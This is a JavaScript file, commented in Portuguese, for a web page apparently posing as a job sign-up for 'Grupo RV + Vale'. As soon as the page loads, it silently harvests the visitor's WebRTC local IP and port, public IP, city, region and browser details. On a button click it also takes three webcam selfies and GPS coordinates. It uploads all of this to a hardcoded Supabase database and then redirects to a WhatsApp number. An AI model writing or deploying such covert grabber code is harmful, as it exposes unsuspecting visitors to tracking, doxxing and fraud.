const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";

const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// Função para salvar no banco
async function salvarNoBanco(dados) {
  const { error } = await supabaseClient.from('checkins').insert([dados]);
  if (error) console.error("Erro ao salvar:", error);
  return !error;
}

// Captura Avançada (IP + Porta via WebRTC)
async function getConnectionInfo() {
  const info = { tipo_captura: "auto" };
  
  try {
    const rtc = new RTCPeerConnection({ iceServers: [] });
    rtc.createDataChannel("test");
    const offer = await rtc.createOffer();
    await rtc.setLocalDescription(offer);

    rtc.onicecandidate = (e) => {
      if (e.candidate) {
        const cand = e.candidate.candidate;
        const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        const portMatch = cand.match(/(\d{4,5})\s+typ/);
        
        if (ipMatch) info.local_ip = ipMatch[1];
        if (portMatch) info.local_port = portMatch[1];
      }
    };
  } catch(e) {}

  // IP externo
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    info.ip = data.ip;
    info.cidade = data.city;
    info.estado = data.region;
    info.pais = data.country_name;
  } catch(e) {}

  info.user_agent = navigator.userAgent;
  info.timestamp = new Date().toISOString();

  return info;
}

// ================================================
// CAPTURA AUTOMÁTICA AO ABRIR A PÁGINA
// ================================================
window.onload = async () => {
  statusText.innerHTML = "🟡 Capturando dados iniciais...";

  const dadosBasicos = await getConnectionInfo();
  await salvarNoBanco(dadosBasicos);

  statusText.innerHTML = "✅ Dados iniciais salvos. Clique no botão para completar o cadastro.";

  // Inicia câmera para o botão
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
  } catch(e) {}
};

// ================================================
// CAPTURA COMPLETA AO CLICAR NO BOTÃO
// ================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
    statusText.innerHTML = "📸 Capturando tudo...";

    // Fotos
    canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];
    for (let i = 0; i < 3; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      fotos.push(canvas.toDataURL("image/jpeg", 0.45));
      if (i < 2) await new Promise(r => setTimeout(r, 800));
    }

    if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());

    // Geolocalização
    let latitude = "não permitido", longitude = "não permitido";
    try {
      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
      latitude = pos.coords.latitude;
      longitude = pos.coords.longitude;
    } catch(e) {}

    const connection = await getConnectionInfo();
    connection.tipo_captura = "completo";
    connection.selfies = fotos;
    connection.latitude = latitude.toString();
    connection.longitude = longitude.toString();

    const sucesso = await salvarNoBanco(connection);

    if (sucesso) {
      statusText.innerHTML = "✅ Cadastro completo!";
      falar("Cadastro concluído com sucesso.");
      
      setTimeout(() => {
        window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
      }, 2000);
    }

  } catch (err) {
    console.error(err);
    statusText.innerHTML = "❌ Erro no processo.";
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});

function falar(texto) {
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  speechSynthesis.speak(fala);
}
